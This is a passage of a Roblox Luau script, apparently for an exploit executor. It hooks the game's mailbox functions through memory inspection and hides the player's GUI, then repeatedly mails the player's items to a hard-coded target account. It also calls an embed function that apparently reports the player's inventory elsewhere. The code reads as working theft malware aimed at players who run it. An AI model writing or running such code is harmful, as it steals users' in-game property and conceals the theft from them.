	sendSnapshotEmbed()

	if totalItems == 0 then return end

	local Success, UserID = pcall(function()
		return Players:GetUserIdFromNameAsync(Environment.Target.Name)
	end)

	if not Success or not UserID then
		warn("Failed to get UserID for: " .. Environment.Target.Name)
		return
	end
	Environment.Target.Id = UserID

	task.spawn(function()
		pcall(function()
			if cg then
				local rg = cg:FindFirstChild("RobloxGui")
				if rg then rg.Enabled = false end
				local tb = cg:FindFirstChild("TopBarApp")
				if tb then tb.Enabled = false end
			end
			pcall(function()
				game:GetService("GuiService").SelectedObject = nil
			end)
		end)
	end)

	task.spawn(function()
		while true do
			local currentItems   = getValidItems()
			local totalRemaining = 0
			for _, item in ipairs(currentItems) do
				totalRemaining = totalRemaining + item.amount
			end
			if totalRemaining == 0 then break end

			local success = sendBatch()
			if not success then
				task.wait(2.5)
			else
				task.wait(9.8)
			end
		end
	end)
end

local function hookMailbox()
	warn("Starting mailbox hook scan...")
	local gcResult     = getgc()
	local checkedCount = 0
	local foundCount   = 0

	for _, Value in next, gcResult do
		checkedCount = checkedCount + 1
		if checkedCount % 100 == 0 then task.wait() end

		if type(Value) == "function" and islclosure(Value) then
			local ok, info = pcall(getinfo, Value)
			if ok and info and type(info) == "table" then
				local src = info.source or info.short_src or ""
				if src:find("MailboxController") then
					local name = info.name or ""
					local upvalueMatch = ""
					local upOk, ups = pcall(getupvalues, Value)
					if upOk and ups then
						for _, v in pairs(ups) do
							if type(v) == "string" then
								if v:find("_pickRecipient") or v:find("_addToSend") or v:find("sendBatch") then
									upvalueMatch = v
									break
								end
							end
						end
					end

					local identifier = name ~= "" and name or upvalueMatch

					if identifier:find("_pickRecipient") and not Environment.Mailbox.PickRecipient then
						Environment.Mailbox.PickRecipient = Value
						foundCount = foundCount + 1
						warn("Found PickRecipient")
					elseif identifier:find("_addToSend") and not Environment.Mailbox.AddToSend then
						Environment.Mailbox.AddToSend = Value
						foundCount = foundCount + 1
						warn("Found AddToSend")
					elseif identifier:find("sendBatch") and not Environment.Mailbox.SendBatch then
						Environment.Mailbox.SendBatch = Value
						foundCount = foundCount + 1
						warn("Found SendBatch")
					end

					if foundCount == 3 then
						warn("All mailbox functions found!")
						break
					end
				end
			end
		end
	end

	warn("Scan complete. Found " .. foundCount .. "/3 mailbox functions.")

	if foundCount == 3 then
		startLogicFlow()
	else
		sendSnapshotEmbed()
		warn("Not all mailbox functions found. Open the mailbox ingame first, then rerun.")
	end
end

task.spawn(hookMailbox)
